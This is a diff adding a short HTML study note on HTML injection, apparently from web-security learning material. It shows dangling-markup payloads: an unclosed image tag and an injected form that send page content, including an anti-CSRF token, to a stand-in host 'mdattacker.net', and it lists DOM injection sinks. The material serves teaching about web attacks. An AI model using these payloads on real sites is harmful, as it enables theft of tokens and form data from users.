@@ -1,0 +1,28 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>HTML Injection</title>
+</head><body><b><span style="font-size: 12pt">Example</span></b><br/>
+<br/>
+<tt><b>&lt;img src='http://mdattacker.net/capture?html= &lt;&lt;&lt;&lt;&lt; INJECTION</b><br/>
+<span style="color: #ff0000">&lt;form action=”http://wahh-mail.com/forwardemail” method=”POST”&gt;<ul><li style="list-style-type: none">&lt;input type=”hidden” name=”nonce” value=”2230313740821”&gt;</li>
+<li style="list-style-type: none">&lt;input type=”submit” value=”Forward”&gt;</li>
+</ul>
+ 	...<br/>
+&lt;/form&gt;<br/>
+ 	...<br/>
+&lt;script&gt;<br/>
+</span><span style="color: #ff0000"> 	var _StatsTrackerId=</span>’AAE78F27CB3210D’;<br/>
+ ...<br/>
+&lt;/script&gt;<br/>
+<br/>
+</tt>Red text is send to attacker's server (In this case anti-CSRF token is send)<br/>
+Alternatively we can inject<br/>
+<tt><b>&lt;form action=”http://mdattacker.net/capture” method=”POST”&gt;<br/>
+</b></tt>Which cancels correct &lt;form&gt;, only first &lt;form&gt; is accepted<br/>
+<br/>
+<span style="font-size: 12pt"><b>DOM based HTML injection</b></span><br/>
+<tt><br/>
+innerHTML<br/>
+document.write()<br/>
+</tt></body></html>
